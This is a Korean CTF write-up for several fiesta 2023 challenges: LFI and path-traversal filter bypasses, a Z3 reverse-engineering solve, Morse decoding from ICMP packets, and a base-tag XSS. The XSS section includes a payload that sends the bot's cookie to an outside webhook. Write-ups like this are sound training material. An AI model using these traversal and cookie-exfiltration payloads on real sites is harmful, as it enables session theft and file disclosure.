![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2010.png)

success.log를 분석해보니 `signin.php`에 접근한 기록이 있다. 로그인을 해야지 mypage.php에 접근할 수 있는 것 같다.

signup으로 계정을 생성하고 로그인해보자. 로그인하면, mypage에 접근할 수 있다.

```python
/mypage.php?uid=4f06e957-f5ce-4bd4-b5b1-d18e183a1a1c&username=sksmsrhksf
```

다시 위 경로에 접속해보면

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2011.png)

2번째 flag를 얻을 수 있다.

마지막으로 새로운 취약점을 찾아야 한다. 

burp suite로 통신한 흔적을 찾아보니

```python
http://3.35.136.196/application/getFile.php?path=
```

getFile.php를 이용해서 mypage에 업로드한 사진을 가져온다는 것을 알 수 있다.

```python
http://3.35.136.196/application/getFile.php?path=/application/getFile.php
```

위 경로로 접근하면 getFile.php의 코드를 LFI 할 수 있다.

```python
function getFile(string $filePath): string
{
    $Configuration = new Configuration();
    try {
        if (!validFileData($filePath)) {
            throw new RuntimeException('special character must not include');
        }

        if (preg_match('/[\'|\.\.]/m', $filePath)) {
            $clean_filePath = str_ireplace("..", "", $filePath);
            $clean_filePath = str_ireplace("'", "", $clean_filePath);
        } else {
            $clean_filePath = $filePath;
        }

        if (!file_exists($Configuration->getConfig("BASEDIR") . $clean_filePath)) throw new ErrorException('Not Found');
        if (!file_get_contents($Configuration->getConfig("BASEDIR") . $clean_filePath)) throw new ErrorException('Not Found');
        die(base64_encode(file_get_contents($Configuration->getConfig("BASEDIR") . $clean_filePath)));
```

getFIle.php의 핵심 부분만 보도록 하자.

`preg_match()`로 path에 대한 검증을 하고 있다.

여기서 문제는 `..` 이후에 `‘`를 필터링하고 있다는 점이다.

```python
/application/getFile.php?path=.'./.'./.'./flag
```

따라서 위와 같이 `‘`를 이용해서 검증을 우회하고 LFI를 수행하면 flag를 획득할 수 있다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2012.png)

3번째 flag를 획득했다.

지금까지 얻은 3개의 flag를 모두 합치면 다음과 같다.

```python
fiesta{4f06e957-f5ce-4bd4-b5b1-d18e183a1a1c_b8efe0aadacc75ebd37478ec54d42efd4786b71e_1c738b0adfb2fafaebafac053ec6e7e38a3bc011}
```

## 특별문제 1

---

정확한 인풋값을 알아내고 플래그를 획득하라.

```python
if ( argc == 2 )
{
  if ( strlen(argv[1]) == 9 )
  {
    byte_40437C[0] = sub_401000(*argv[1]);
    byte_40437C[1] = sub_401000(argv[1][1]);
    byte_40437C[2] = sub_401000(argv[1][2]);
    byte_40437C[3] = sub_401000(argv[1][3]);
    byte_40437C[4] = sub_401000(argv[1][4]);
    byte_40437C[5] = 7 * sub_401000(argv[1][5]);
    byte_40437C[6] = sub_401000(argv[1][6]);
    byte_40437C[7] = sub_401000(argv[1][7]);
    byte_40437C[8] = sub_401000(argv[1][8]);
    if ( sub_401030(byte_40437C[0], byte_40437C[1], byte_40437C[2])
      && sub_4010D0(byte_40437C[3], byte_40437C[4], byte_40437C[5]) )
    {
      if ( sub_401160(byte_40437C[6], byte_40437C[7], byte_40437C[8]) )
        MessageBoxW(0, L"Congratulations\nflag: fiesta{md5[key]}", L"WOW", 0);
    }
    return 0;
  }
```

조건에 맞는 argv[1][0] ~ argv[1][8]을 찾는 것이 목표다.

```python
int __cdecl sub_401000(char a1)
{
  if ( a1 <= '9' && a1 >= '0' )
    return a1 - 48;
  else
    return 10;
}
```

`sub_401000()`은 간단하게 숫자 형태의 문자를 ascii 숫자로 변경하는 함수다.

```python
if ( sub_401030(byte_40437C[0], byte_40437C[1], byte_40437C[2])
  && sub_4010D0(byte_40437C[3], byte_40437C[4], byte_40437C[5]) )
{
  if ( sub_401160(byte_40437C[6], byte_40437C[7], byte_40437C[8]) )
    MessageBoxW(0, L"Congratulations\nflag: fiesta{md5[key]}", L"WOW", 0);
}
```

if 조건을 보면 `sub_401030(), sub_4010D0(), sub_401160()`을 통해서 각각의 숫자들을 검증한다.

```python
BOOL __cdecl sub_401030(unsigned __int8 a1, unsigned __int8 a2, unsigned __int8 a3)
{
  if ( a1 == 10 || a2 == 10 || a3 == 10 )
    return 0;
  return 3 * a2 + 2 * a1 == 27
      && 7 * a1 - 7 * a2 / a3 == 37
      && 7 * a2 - 2 * a1 - a3 == 16
      && 5 * a3 + -3 * a1 - a2 == 12;
}
```

예를 들어 `sub_401030()`을 분석하면, 각 인자를 대상으로 연산 조건을 설정하고 조건에 맞는지 확인하는 루틴이다.

나머지 함수들도 연산식은 다르지만 똑같은 매커니즘이다.

### ○ solve

```python
from z3 import *

v1, v2, v3, v4, v5, v6, v7, v8, v9 = Ints('v1 v2 v3 v4 v5 v6 v7 v8 v9')

solver = Solver()

solver.add(3 * v2 + 2 * v1 == 27)
solver.add(7 * v1 - 7 * v2 / v3 == 37)
solver.add(7 * v2 - 2 * v1 - v3 == 16)
solver.add(5 * v3 + -3 * v1 - v2 == 12)

solver.add(7 * v5 - v4 - (7 * v6) == 6)
solver.add(7 * v6 * 7 + 197 * v4 - 11 * v5 == 452)
solver.add(229 * v4 - 7 * v5 - (3 * 7 * v6) == 26)

solver.add(15 * v7 / v8 - v9 == 7)
solver.add(3 * v7 - v8 - v9 == 2)
solver.add(12 * v9 + v7 - 3 * v8 == 12)

if solver.check() == sat:
    model = solver.model()
    v1_value = model[v1].as_long()
    v2_value = model[v2].as_long()
    v3_value = model[v3].as_long()
    v4_value = model[v4].as_long()
    v5_value = model[v5].as_long()
    v6_value = model[v6].as_long()
    v7_value = model[v7].as_long()
    v8_value = model[v8].as_long()
    v9_value = model[v9].as_long()
    print(f'v1 = {v1_value}, v2 = {v2_value}, v3 = {v3_value}')
    print(f'v4 = {v4_value}, v5 = {v5_value}, v6 = {v6_value}')
    print(f'v7 = {v7_value}, v8 = {v8_value}, v9 = {v9_value}')
    print(f'key : {v1_value}{v2_value}{v3_value}{v4_value}{v5_value}{v6_value}{v7_value}{v8_value}{v9_value}')
else:
    print('해가 없습니다.')
```

위와 같이 연산식 조건에 맞는 값을 찾도록 Z3 Solver를 이용해서 문제를 해결했다.

```python
$ python solve.py
v1 = 6, v2 = 5, v3 = 7
v4 = 1, v5 = 8, v6 = 7
v7 = 3, v8 = 5, v9 = 2
key : 657187352
md5_key : c4f3024e7ffc971df554aa0054e28926
```

```python
fiesta{c4f3024e7ffc971df554aa0054e28926}
```

## 특별문제 2

---

Q) 패킷을 분석하여 의심되는 ip를 찾으시오.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2013.png)

지속적으로 ping을 전송하는 IP를 발견할 수 있다.

```python
fiesta{172.112.93.7}
```

Q) 의심되는 ip가 사용한 프로토콜을 약자로 기재하시오. flag포맷: fiesta{사용한_프로토콜의_약자}

```python
fiesta{ICMP}
```

이전에 구한 [그림]에서 protocol을 확인하면 알 수 있다.

Q) 전송한 패킷을 분석해 플래그를 얻어 인증하시오. 힌트: 모스부호

```python
ip.src == 172.112.93.7.
```

위와 같이 문제가 되는 IP를 필터링해보자.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2014.png)

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2015.png)

패킷을 하나 잡고 data 영역을 보면 데이터가 존재한다.

```python
2e = .

2d = -
```

를 의미한다.

모스부호라고 했으므로 각 패킷의 모든 모스 부호를 모아보면 다음과 같다.

```python
..-. .-.. .- --. ..--.- .. ... ..--.- ..... -.-. ...-- ....- -... .- ..... ..-. ..... . ..--- ----. ---.. ----- -.-. .---- .---- -... -.-. ----. ..... ...-- ..--- . -... ----. .---- .- -... -.... -.. -.... ..-. . ..-. ---.. -.-. ---.. -.. -----
```

```python
FLAG_IS_5C34BA5F5E2980C11BC9532EB91AB6D6FEF8C8D0
```

모스부호를 해석하면 flag를 획득할 수 있다.

## 특별문제 3

---

요약하면 편지를 전송해서 봇에게 XSS를 트리거 하는 문제다.

```python
def read_letter(url):
    try:
        FLAG = os.environ.get('FLAG')
    except:
        FLAG = 'fiesta{**redact**}'

    cookie = {"name": "FLAG", "value": f"{FLAG}"}
    cookie.update({"domain": "127.0.0.1", "path": "/"})
    chrome_options = ChromeOptions()
    CREDENTIALS = {
        "email": "ef9a2d554146d1799d11d82982736ceb@exmaple.com",
        "password": "b1c64b43724cec92b1a70dff8c38f917b6ba812129c8d00ba8b97037d6a68f9a"
    }
```

XSS로 봇의 쿠키를 탈취하면 된다.

```python
@app.post('/write')
def write_post():
    if 'email' not in session or 'uid' not in session:
        return render_template('index.html', error='login first')

    try:
        email = request.form.get('email')
        text = request.form.get('text')

        if not check_invalid_email(email):
            return redirect(url_for('main', error='invalid email'))

        if not check_invalid_letters(text):
            return redirect(url_for('main', error='invalid letter'))

        if not create_letter(data={'email': email, 'text': text}):
            return redirect(url_for('main', error='save error'))

        letter_id = get_letter_non_check(uid=session['uid'])[0]

        if letter_id == -1:
            return redirect(url_for('main', error='ERROR'))
        if not read_letter(url=f'/letter/{letter_id}'):
            return redirect(url_for('main', error='ERROR'))

        return redirect(url_for('main', error='Send Letter'))
    except Exception as e:
        print("create letter error:", e, flush=True)
        return redirect(url_for('main', error='ERROR'))
```

봇에게 편지를 보내는 방법은 간단하다.

`/write` 기능을 이용하면 된다.

```python
@app.after_request
def after_request_csp(response):
    global NONCE
    response.headers.add('Content-security-Policy',
                         f"script-src 'strict-dynamic' 'nonce-{NONCE}' 'unsafe-inline' http: https:; object-src 'none'; style-src 'self'; object-src 'none'; img-src 'self'; "
                         f"require-trusted-types-for 'script';")
    return response
```

CSP 정책을 확인해보자.

`base-uri`에 대한 정책이 없으므로 `base-uri`를 이용한 RFI XSS가 가능하다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2016.png)

XSS가 발생하는 부분은 Write Letter이다.

```python
</textarea><base href='http://[C2]:[PORT]/'><textarea>
```

payload는 위와 같다.

`textarea` 중간에 base 태그를 삽입한 형태로 구성했다.

```python
<textarea class="form-control" id="text" name="text" rows="5" readonly>{{ letter[1] |safe }}</textarea>
```

그 이유는 view.html을 확인해보면 알 수 있다. 

letter가 `<textarea>` 사이에 삽입된다.

하지만 safe 설정이 있어서 `letter[1]`이 html 인코딩 되지 않는다. 그러므로 `<textarea>`를 덮고 `<base>`를 삽입하는 형태로 공격이 가능하다.

다음으로 공격 전에 `base-uri`로 리다이렉트 할 공격 서버를 설정하자.

```python
/static/js/bootstrap.bundle.min.js
```

```python
location.href='https://webhook.site/3b992ffc-aea9-405e-bde3-fe0c0985717f?'+document.cookie
```

공격자 서버에 위와 같이 파일을 생성한다.

view.html에서 `bootstrap.bundle.min.js`을 로드할 때, 공격자의 서버로부터 RFI를 할 것이다.

```python
</textarea><base href='http://[C2]:[PORT]/'><textarea>
```

마지막으로 write letter 기능을 통해 payload를 전송하자.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2017.png)

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2018.png)

C&C 서버를 거쳐서 webhook으로 flag가 전달된다.

## 특별문제 4

---

```python
fiesta{filedownload}
```

게시판 페이지이며, file download 취약점이 존재한다.

취약점이 존재하는 부분은 write 과정에서 파일명 부분이다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2019.png)

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2020.png)

```python
%2f..%2f..%2fflag.txt
```

위와 같이 url 인코딩으로 / 검증을 우회하고 /flag.txt를 파일 경로로 지정하도록 파일명을 조작해서 파일을 업로드 업로드한다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%2021.png)

생성한 글에 접속하고 파일을 download 받으면 flag.txt를 획득할 수 있다.

```python
fiesta{c941d40a4cff0dc4daa0510a9b7fc970}
```